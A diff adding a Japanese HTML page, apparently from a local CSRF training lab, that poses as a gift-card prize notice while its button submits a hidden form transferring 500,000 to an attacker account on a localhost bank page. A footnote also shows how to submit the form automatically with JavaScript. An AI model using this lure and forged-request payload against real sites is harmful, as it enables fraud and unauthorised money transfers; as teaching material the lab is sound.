@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>豪華プレゼント当選！ (攻撃者サイト)</title>
+    <style>
+        body { font-family: sans-serif; margin: 30px; background: #fff1f2; color: #1e293b; text-align: center; }
+        .box { background: white; border: 2px solid #e11d48; border-radius: 8px; padding: 30px; max-width: 600px; margin: 0 auto; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .btn { padding: 12px 24px; background: #e11d48; color: white; border: none; border-radius: 6px; font-size: 1.1em; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🎉 おめでとうございます！ギフト券が当選しました！</h1>
+        <p>下のボタンを押して賞品をお受け取りください。</p>
+
+        <!-- 攻撃者の罠フォーム: 送信先は被害者の銀行 (localhost:8080) -->
+        <form id="trap-form" method="POST" action="http://localhost:8080/phase2/2-2_csrf_lab.php" target="_blank">
+            <input type="hidden" name="to_account" value="attacker_evil_account">
+            <input type="hidden" name="amount" value="500000">
+            <!-- CSRFトークンは攻撃者には分からないため送信できない！ -->
+            <button type="submit" class="btn">今すぐ賞品を受け取る（送金ボタン偽装）</button>
+        </form>
+
+        <p style="margin-top: 20px; font-size: 0.85em; color: #64748b;">
+            ※ バックグラウンドで勝手に送信する自動スクリプト（<code>document.getElementById('trap-form').submit()</code>）を仕込むことも可能です。
+        </p>
+    </div>
+</body>
+</html>
